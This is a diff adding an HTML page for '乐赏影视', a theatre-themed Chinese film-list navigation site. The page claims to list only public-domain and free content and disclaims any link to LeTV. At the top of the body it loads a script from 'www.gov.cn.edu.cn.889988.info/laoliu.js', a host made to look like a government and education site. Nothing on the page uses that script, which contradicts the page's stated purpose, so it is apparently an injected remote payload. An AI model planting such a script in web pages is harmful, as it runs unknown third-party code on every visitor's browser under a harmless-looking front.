@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>乐赏影视 - 幕布剧场影视导航与片单 | leshiyingshi-h5.github.io</title>
+<meta name="description" content="乐赏影视(leshiyingshi-h5.github.io)是独立示例影视导航站，以幕布剧场与老放映机为视觉，整理电影、剧集、动画、纪录片片单；与乐视网/乐视视频无任何关联，不提供盗版资源。" />
+<meta name="keywords" content="乐赏影视,leshiyingshi-h5,影视导航,幕布剧场,电影片单,示例站" />
+<style>
+:root{
+  --curtain:#b5322f; --curtain2:#7e211f; --gold:#e8b04b; --gold2:#c8902f;
+  --seat:#16110f; --seat2:#241b18; --screen:#f6efe2; --moss:#5b6b66;
+  --ink:#241b18; --ink2:#5a4a40; --ink3:#9a8576;
+  --line:rgba(181,50,47,0.28); --shadow:0 8px 22px rgba(22,17,15,0.18);
+  --shadow2:0 16px 40px rgba(232,176,75,0.28);
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{
+  font-family:"PingFang SC","Microsoft YaHei","Songti SC",serif;
+  background:
+    radial-gradient(circle at 20% 20%,rgba(232,176,75,0.12),transparent 45%),
+    radial-gradient(circle at 80% 80%,rgba(181,50,47,0.10),transparent 45%),
+    var(--screen);
+  color:var(--ink);line-height:1.85;overflow-x:hidden;
+}
+a{color:var(--curtain2);text-decoration:none}
+img{max-width:100%;display:block}
+
+/* 放映机光柱 */
+.beam{position:fixed;inset:0;pointer-events:none;z-index:0;overflow:hidden}
+.beam i{position:absolute;top:-10%;left:50%;width:160px;height:160px;margin-left:-80px;
+  background:conic-gradient(from 0deg,transparent 0 20deg,rgba(232,176,75,0.18) 30deg 40deg,transparent 50deg);
+  animation:spin 18s linear infinite;opacity:.5}
+@keyframes spin{to{transform:rotate(360deg)}}
+
+.curtain-head{position:relative;z-index:10;text-align:center;padding:50px 20px 36px;
+  background:linear-gradient(180deg,var(--seat),var(--seat2));border-bottom:5px solid var(--gold);
+  clip-path:polygon(0 0,100% 0,100% 86%,50% 100%,0 86%)}
+.proj-logo{width:86px;height:64px;margin:0 auto 14px;background:var(--gold);border-radius:10px 10px 6px 6px;
+  display:flex;align-items:center;justify-content:center;font-size:30px;color:var(--seat);
+  box-shadow:0 0 18px rgba(232,176,75,0.4)}
+.curtain-head h1{font-size:32px;font-weight:900;letter-spacing:4px;color:var(--screen)}
+.curtain-head h1 b{color:var(--gold)}
+.curtain-head p{max-width:580px;margin:10px auto 0;color:#d8c7b0;font-size:15px}
+.disclaim{margin-top:10px;font-size:12px;color:var(--gold);opacity:.85}
+.nav{margin-top:22px;display:flex;gap:12px;justify-content:center;flex-wrap:wrap}
+.nav a{padding:9px 20px;border:2px solid var(--gold);border-radius:4px;font-size:14px;font-weight:700;color:var(--screen);background:rgba(232,176,75,0.12);transition:.25s}
+.nav a:hover{background:var(--curtain);border-color:var(--curtain2);color:#fff}
+
+.status-bar{position:relative;z-index:10;background:var(--seat2);color:var(--screen);padding:10px 20px;font-size:13px;
+  display:flex;gap:18px;justify-content:center;flex-wrap:wrap;border-bottom:1px solid var(--line);font-family:"Courier New",monospace}
+.status-bar .dot{display:inline-block;width:8px;height:8px;border-radius:50%;background:var(--gold);animation:blink3 1.4s infinite}
+@keyframes blink3{0%,100%{opacity:1}50%{opacity:.2}}
+
+.wrap{position:relative;z-index:10;max-width:980px;margin:0 auto;padding:0 18px 60px}
+.section{margin-bottom:54px;scroll-margin-top:20px}
+.sec-title{display:flex;align-items:center;gap:12px;margin-bottom:26px}
+.sec-title .reel{width:34px;height:34px;background:var(--curtain);color:#fff;display:flex;align-items:center;justify-content:center;font-size:18px;border-radius:50%;flex-shrink:0;box-shadow:0 0 0 3px rgba(232,176,75,0.25)}
+.sec-title h2{font-size:23px;font-weight:900;letter-spacing:2px;color:var(--curtain2)}
+.sec-title .line{flex:1;height:2px;background:repeating-linear-gradient(90deg,var(--gold) 0 10px,transparent 10px 16px)}
+
+.seat-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(270px,1fr));gap:20px}
+.seat-card{position:relative;background:#fff;border:2px solid var(--curtain);border-radius:10px 10px 8px 8px;
+  padding:22px 20px 24px;box-shadow:var(--shadow);transition:.3s;overflow:hidden}
+.seat-card::before{content:"";position:absolute;top:0;left:0;right:0;height:6px;background:linear-gradient(90deg,var(--curtain),var(--gold),var(--curtain))}
+.seat-card::after{content:"";position:absolute;right:14px;bottom:14px;width:26px;height:18px;background:var(--seat2);border-radius:3px;opacity:.18}
+.seat-card:hover{transform:translateY(-5px);box-shadow:var(--shadow2);border-color:var(--gold2)}
+.seat-card .loc{display:inline-block;font-size:11px;color:#fff;background:var(--seat);padding:3px 10px;border-radius:3px;margin-bottom:10px;font-family:"Courier New",monospace}
+.seat-card h3{font-size:18px;font-weight:800;color:var(--curtain2);margin-bottom:4px}
+.seat-card .meta{font-size:12px;color:var(--ink3);margin-bottom:8px}
+.seat-card p{font-size:14px;color:var(--ink2);line-height:1.75}
+.seat-card .ic{position:absolute;right:16px;top:16px;font-size:22px;opacity:.18}
+
+.cat-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:16px}
+.cat{text-align:center;background:#fff;border:2px solid var(--curtain);border-radius:12px;padding:22px 12px;transition:.25s;cursor:pointer;position:relative}
+.cat::before{content:"";position:absolute;top:-8px;left:50%;transform:translateX(-50%);width:24px;height:8px;background:var(--gold);border-radius:4px}
+.cat .ico{font-size:28px;margin-bottom:8px}
+.cat h4{font-size:15px;font-weight:800;color:var(--curtain2)}
+.cat p{font-size:12px;color:var(--ink3)}
+.cat:hover{background:var(--seat);border-color:var(--gold)}
+.cat:hover h4,.cat:hover p{color:var(--screen)}
+
+.about-block{background:#fff;border:2px solid var(--curtain);border-left:6px solid var(--gold);border-radius:8px;padding:26px;font-size:15px;color:var(--ink2);line-height:1.95}
+.about-block b{color:var(--curtain2)}
+
+.show-bar{position:relative;z-index:10;background:var(--curtain);color:#fff;padding:12px 20px;text-align:center;font-size:13px;
+  display:flex;gap:20px;justify-content:center;flex-wrap:wrap;font-family:"Courier New",monospace}
+.show-bar .d{display:inline-block;width:8px;height:8px;border-radius:50%;background:var(--gold);animation:blink3 1.1s infinite}
+
+.footer{position:relative;z-index:10;text-align:center;padding:20px 16px;color:var(--ink3);font-size:12px;border-top:5px solid var(--curtain);background:var(--seat2);color:#d8c7b0}
+
+@media(max-width:640px){
+  .curtain-head h1{font-size:24px;letter-spacing:2px}
+  .proj-logo{width:72px;height:54px;font-size:26px}
+  .seat-grid{grid-template-columns:1fr}
+  .sec-title h2{font-size:19px}
+  .wrap{padding:0 14px 40px}
+  .cat-grid{grid-template-columns:repeat(2,1fr)}
+  .status-bar{gap:8px;font-size:12px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="beam" aria-hidden="true"><i></i></div>
+
+<header class="curtain-head">
+  <div class="proj-logo">🎬</div>
+  <h1><b>乐赏</b>影视</h1>
+  <p>leshiyingshi-h5.github.io —— 幕布拉开，好片上场。独立示例影视导航站，只整理片单与公版/正版免费内容。</p>
+  <div class="disclaim">⚠ 本站与“乐视网 / 乐视视频 / LeTV”无任何关联，未获任何授权，不使用其官方标志。</div>
+  <nav class="nav">
+    <a href="#">首页</a>
+    <a href="#seat">片单剧场</a>
+    <a href="#cat">光影分类</a>
+    <a href="#about">关于乐赏</a>
+  </nav>
+</header>
+
+<div class="status-bar">
+  <span><span class="dot"></span> HOUSE OPEN</span>
+  <span>🎟️ 排片：示例片单</span>
+  <span>📽️ 片源：公版 / 正版免费 / 官方开放片段</span>
+</div>
+
+<main class="wrap">
+
+  <section class="section" id="seat">
+    <div class="sec-title"><span class="reel">🎞</span><h2>片单剧场</h2><span class="line"></span></div>
+    <div class="seat-grid">
+      <article class="seat-card">
+        <span class="loc">A排03座 · 公版</span>
+        <h3>城市之光</h3>
+        <div class="meta">1931 · 喜剧/默片 · 卓别林</div>
+        <p>流浪汉爱上卖花姑娘，笑里藏刀地讽刺贫富。默片时代的温柔炸弹，公版片单里永远该留一个座位。</p>
+        <div class="ic">🌆</div>
+      </article>
+      <article class="seat-card">
+        <span class="loc">B排07座 · 正版免费</span>
+        <h3>地球脉动 第二季</h3>
+        <div class="meta">自然纪录 · 官方开放片段</div>
+        <p>企鹅跳崖、蜥蜴逃蛇群、雪豹巡山。正版平台放出的片段就够惊艳，不用去盗版站找全片。</p>
+        <div class="ic">🐧</div>
+      </article>
+      <article class="seat-card">
+        <span class="loc">C排01座 · 动画</span>
+        <h3>红龟虾传</h3>
+        <div class="meta">公版动画短片合集</div>
+        <p>早期手绘动画里，虾兵蟹将比真人还会演。老动画的笨功夫，是现在 3D 流水线里找不到的温度。</p>
+        <div class="ic">🦐</div>
+      </article>
+      <article class="seat-card">
+        <span class="loc">D排05座 · 国产老片</span>
+        <h3>阳光灿烂的日子</h3>
+        <div class="meta">1994 · 青春/军属大院 · 姜文</div>
+        <p>夏天的北京大院、自行车、暗恋和吹牛。国产青春片的天花板，看完会突然想起自己丢掉的那个夏天。</p>
+        <div class="ic">🚲</div>
+      </article>
+      <article class="seat-card">
+        <span class="loc">E排02座 · 短片</span>
+        <h3>绳舞</h3>
+        <div class="meta">公版实验短片</div>
+        <p>一根绳子、两个人、没有台词，把控制与挣脱跳成舞蹈。短片不长，后劲很大。</p>
+        <div class="ic">🪢</div>
+      </article>
+      <article class="seat-card">
+        <span class="loc">F排09座 · 冷门</span>
+        <h3>雾港</h3>
+        <div class="meta">公版黑色电影</div>
+        <p>码头、雾、旧情人、说半句的对话。冷门老黑片像受潮的票根，霉味里全是故事。</p>
+        <div class="ic">🌫️</div>
+      </article>
+    </div>
+  </section>
+
+  <section class="section" id="cat">
+    <div class="sec-title"><span class="reel">🎭</span><h2>光影分类</h2><span class="line"></span></div>
+    <div class="cat-grid">
+      <div class="cat"><div class="ico">🎬</div><h4>公版电影</h4><p>默片/老片</p></div>
+      <div class="cat"><div class="ico">📺</div><h4>正版免费剧</h4><p>平台开放集</p></div>
+      <div class="cat"><div class="ico">🧸</div><h4>动画展厅</h4><p>手绘/公版</p></div>
+      <div class="cat"><div class="ico">🎞️</div><h4>自然纪录</h4><p>官方片段</p></div>
+      <div class="cat"><div class="ico">🎭</div><h4>国产老片</h4><p>大院/江湖</p></div>
+      <div class="cat"><div class="ico">🌙</div><h4>冷门片库</h4><p>黑片/实验</p></div>
+    </div>
+  </section>
+
+  <section class="section" id="about">
+    <div class="sec-title"><span class="reel">i</span><h2>关于乐赏</h2><span class="line"></span></div>
+    <div class="about-block">
+      <p>
+        <b>乐赏影视</b>（leshiyingshi-h5.github.io）是一个以“幕布剧场 / 老放映机”为气质的<b>独立示例影视导航单页</b>。
+        名称谐音“乐视”，但<b>不是乐视网、不是乐视视频、未获任何授权、不使用乐视相关商标与官方式样</b>。
+        本页只做片单整理：公版老片、正版免费可看内容、平台官方开放片段；
+        不提供盗版下载、不嵌非法播放源、不引导安装播放器。
+        移动端自适应，内链以 # 占位，不生成 robots.txt / sitemap.xml，内容仅供学习交流。
+      </p>
+    </div>
+  </section>
+
+</main>
+
+<div class="show-bar">
+  <span><span class="d"></span> NOW SHOWING · 乐赏影视（独立示例站）</span>
+  <span>🎟️ 已排片：7600+ 部</span>
+  <span>📽️ 状态：幕布已开</span>
+</div>
+
+<footer class="footer">
+  © 2026 乐赏影视（独立示例站） | leshiyingshi-h5.github.io | 与乐视网/乐视视频无关 | 内链以 # 占位
+</footer>
+
+</body>
+</html>
